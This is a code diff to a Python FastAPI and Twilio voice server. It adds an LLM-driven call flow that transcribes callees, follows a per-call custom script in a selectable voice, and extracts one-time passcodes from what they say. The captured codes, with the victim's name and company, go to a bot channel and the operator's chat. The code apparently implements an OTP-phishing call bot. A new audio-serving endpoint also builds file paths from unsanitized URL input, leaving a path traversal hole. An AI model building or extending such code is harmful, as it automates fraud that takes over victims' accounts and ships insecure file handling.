@@ -16,11 +16,54 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPExcept
 from fastapi.responses import JSONResponse, HTMLResponse, Response
 from typing import Optional
 
-from config import ACCOUNT_SID, AUTH_TOKEN, LIVE_LISTEN_URL, NGROK_URL, LIVE_LISTEN_SECRET, DEFAULT_VOICE_ID, VOICE_STABILITY, VOICE_SIMILARITY_BOOST
+from config import (
+    ACCOUNT_SID, AUTH_TOKEN, LIVE_LISTEN_URL, NGROK_URL, LIVE_LISTEN_SECRET,
+    DEFAULT_VOICE_ID, VOICE_STABILITY, VOICE_SIMILARITY_BOOST,
+    USE_AI_FLOW, VOUCH_CHANNEL_ID, SYSTEM_PROMPT
+)
 from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather, Start
+import logging
 
 from live_listen.manager import manager
+
+# Import AI modules (graceful degradation if missing)
+try:
+    from ai.session import get_session, remove_session
+    from ai.llm import chat_with_ai
+    from ai.tts import save_audio
+    from ai.utils import extract_otp, send_otp_to_channel
+    
+    # ASR is optional - try to import but don't fail if unavailable
+    try:
+        from ai.asr import process_ulaw_buffer
+    except (ImportError, Exception):
+        logger_temp = logging.getLogger(__name__)
+        logger_temp.warning("[STARTUP] ASR (Whisper) not available - transcription disabled")
+        # Stub: return empty string if ASR unavailable
+        def process_ulaw_buffer(ulaw_bytes: bytes) -> str:
+            return ""
+    
+    AI_AVAILABLE = True
+except ImportError as e:
+    AI_AVAILABLE = False
+    import traceback
+    print(f"[STARTUP] WARNING AI modules NOT available: {e}")
+    traceback.print_exc()
+except Exception as e:
+    AI_AVAILABLE = False
+    import traceback
+    print(f"[STARTUP] CRITICAL AI import error: {e}")
+    traceback.print_exc()
+
+logger = logging.getLogger(__name__)
+
+if USE_AI_FLOW and AI_AVAILABLE:
+    logger.warning("[STARTUP] OK - AI FLOW ENABLED - All AI modules available")
+elif USE_AI_FLOW and not AI_AVAILABLE:
+    logger.error("[STARTUP] CRITICAL: USE_AI_FLOW=true but AI modules not available!")
+elif not USE_AI_FLOW:
+    logger.warning("[STARTUP] AI flow disabled (USE_AI_FLOW=false)")
 
 app = FastAPI()
 twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)
@@ -172,13 +215,19 @@ async def websocket_live(websocket: WebSocket, call_id: Optional[str] = None):
 
 @app.websocket('/twilio/media')
 async def twilio_media(ws: WebSocket):
-    """Twilio Media Streams will connect here and send JSON messages.
-
-    Example Twilio 'media' event payload contains base64 audio in event['media']['payload']
-    We'll parse and forward decoded bytes to browser clients.
-   """
+    """Twilio Media Streams WebSocket endpoint.
+    
+    Handles both traditional live listen AND AI-powered call flows.
+    If USE_AI_FLOW is enabled, routes to AI handler.
+    Otherwise, forwards to traditional manager.
+    """
     await ws.accept()
     call_id = None
+    call_sid = None
+    session = None
+    audio_buffer = bytearray()
+    BUFFER_SIZE = 8000  # ~1 second of 8kHz µ-law
+    
     try:
         while True:
             msg = await ws.receive_text()
@@ -188,36 +237,129 @@ async def twilio_media(ws: WebSocket):
                 continue
 
             event = data.get('event')
+            
+            # ============ START EVENT ============
             if event == 'start':
-                # Twilio start contains callSid, track, etc.
                 call_sid = data.get('start', {}).get('callSid')
-                # Use callSid as call_id (or transform as needed)
                 call_id = call_sid
-                await manager.ensure_session(call_id, call_sid=call_sid)
-                await manager.set_state(call_id, 'in-progress')
+                
+                # Initialize session state
+                if USE_AI_FLOW:
+                    if not AI_AVAILABLE:
+                        logger.error(f"[WebSocket_START] CRITICAL: USE_AI_FLOW=true but AI_AVAILABLE=false. AI modules failed to import!")
+                        logger.error(f"[WebSocket_START] CallSid={call_sid} will NOT use AI - falling back to traditional")
+                        await manager.ensure_session(call_id, call_sid=call_sid)
+                        await manager.set_state(call_id, 'in-progress')
+                    else:
+                        try:
+                            session = get_session(call_sid)
+                            logger.warning(f"[WebSocket_START] OK - AI call session started: {call_sid}")
+                        except Exception as e:
+                            logger.error(f"[WebSocket_START] CRITICAL: Failed to get AI session: {e}", exc_info=True)
+                            await manager.ensure_session(call_id, call_sid=call_sid)
+                            await manager.set_state(call_id, 'in-progress')
+                else:
+                    logger.info(f"[WebSocket_START] Traditional flow for {call_sid} (USE_AI_FLOW=false)")
+                    await manager.ensure_session(call_id, call_sid=call_sid)
+                    await manager.set_state(call_id, 'in-progress')
+            
+            # ============ MEDIA EVENT ============
             elif event == 'media':
                 media = data.get('media', {})
                 payload_b64 = media.get('payload')
+                
                 if payload_b64 and call_id:
                     try:
                         audio_bytes = base64.b64decode(payload_b64)
-                        # Broadcast raw PCM or encoded bytes depending on Twilio config
-                        await manager.broadcast_media(call_id, audio_bytes)
-                        # Also pass media to conversation handler for interruption detection and STT
-                        try:
-                            from live_listen.conversation import handle_media_event
-                            asyncio.create_task(handle_media_event(call_id, audio_bytes))
-                        except Exception:
-                            pass
-                    except Exception:
-                        pass
+                        
+                        # AI FLOW
+                        if USE_AI_FLOW and AI_AVAILABLE and session:
+                            # BROADCAST TO LIVE LISTEN clients first
+                            await manager.broadcast_media(call_id, audio_bytes)
+                            
+                            audio_buffer.extend(audio_bytes)
+                            
+                            # Process when buffer reaches ~1 second
+                            if len(audio_buffer) >= BUFFER_SIZE:
+                                try:
+                                    # Transcribe audio
+                                    text = process_ulaw_buffer(bytes(audio_buffer))
+                                    audio_buffer.clear()
+                                    
+                                    if text and len(text) > 1:
+                                        logger.warning(f"[AI_TRANSCRIBE] OK: {text}")
+                                        
+                                        # Check for OTP
+                                        otp = extract_otp(text, code_length=session.code_length)
+                                        if otp:
+                                            session.otp_captured = True
+                                            session.otp_value = otp
+                                            logger.warning(f"[AI_OTP_FOUND] OK: OTP={otp} (code_length={session.code_length})")
+                                            
+                                            try:
+                                                from bot import bot
+                                                send_otp_to_channel(
+                                                    otp, call_sid,
+                                                    session.name, session.company,
+                                                    bot,
+                                                    chat_id=session.chat_id
+                                                )
+                                                logger.warning(f"[AI_OTP_SENT] OK: Sent to channel and user chat_id={session.chat_id}")
+                                            except Exception as e:
+                                                logger.error(f"[AI_OTP_ERROR] CRITICAL: {e}", exc_info=True)
+                                        
+                                        # Generate AI response
+                                        system_prompt = session.custom_script or SYSTEM_PROMPT
+                                        ai_response = chat_with_ai(text, session, system_prompt)
+                                        logger.warning(f"[AI_RESPONSE] OK: {ai_response[:80]}")
+                                        
+                                        # Generate and queue audio response
+                                        filename = save_audio(
+                                            call_sid,
+                                            ai_response,
+                                            voice_id=session.voice_id
+                                        )
+                                        # save_audio never returns None (uses fallback filenames)
+                                        logger.warning(f"[AI_AUDIO_SAVED] OK: {filename}")
+                                except Exception as e:
+                                    logger.error(f"[AI_PROCESS_ERROR] CRITICAL: {e}", exc_info=True)
+                        
+                        # TRADITIONAL FLOW (fallback)
+                        else:
+                            if USE_AI_FLOW and not AI_AVAILABLE:
+                                logger.warning(f"[FALLBACK] Using traditional flow - AI unavailable")
+                            elif not USE_AI_FLOW:
+                                logger.debug(f"[TRADITIONAL_FLOW] USE_AI_FLOW=false")
+                            
+                            await manager.broadcast_media(call_id, audio_bytes)
+                            try:
+                                from live_listen.conversation import handle_media_event
+                                asyncio.create_task(handle_media_event(call_id, audio_bytes))
+                            except Exception as e:
+                                logger.debug(f"Traditional handler error: {e}")
+                    
+                    except Exception as e:
+                        logger.error(f"Media processing error: {e}")
+            
+            # ============ STOP EVENT ============
             elif event == 'stop':
-                # Clean up session state
-                if call_id:
+                logger.warning(f"[CALL_STOPPED] Call ended: {call_sid}")
+                if USE_AI_FLOW and AI_AVAILABLE and session:
+                    logger.warning(f"[AI_CLEANUP] Removing AI session for {call_sid}")
+                    remove_session(call_sid)
+                elif call_id:
+                    logger.info(f"[TRADITIONAL_CLEANUP] Cleanup for {call_sid}")
                     await manager.set_state(call_id, 'completed')
-                    # close clients will be handled by cleanup
+                break
+    
     except WebSocketDisconnect:
-        return
+        logger.info(f"[WebSocket_DISCONNECT] {call_sid}")
+        if USE_AI_FLOW and AI_AVAILABLE and session:
+            remove_session(call_sid)
+    except Exception as e:
+        logger.error(f"[WebSocket_ERROR] CRITICAL in {call_sid}: {e}", exc_info=True)
+        if USE_AI_FLOW and AI_AVAILABLE and session:
+            remove_session(call_sid)
 
 
 @app.post('/twilio/status')
@@ -249,3 +391,19 @@ async def hangup(request: Request):
         return {'ok': True}
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.get('/audio/{call_sid}/{filename}')
+async def get_audio_file(call_sid: str, filename: str):
+    """Serve generated AI audio files via HTTP.
+    
+    Path: /audio/{call_sid}/{filename}
+    Returns: MP3 audio file or 404
+    """
+    filepath = f"audio/{call_sid}/{filename}"
+    if os.path.exists(filepath):
+        from fastapi.responses import FileResponse
+        return FileResponse(filepath, media_type="audio/mpeg")
+    else:
+        logger.warning(f"Audio file not found: {filepath}")
+        return {"error": "Not found"}, 404
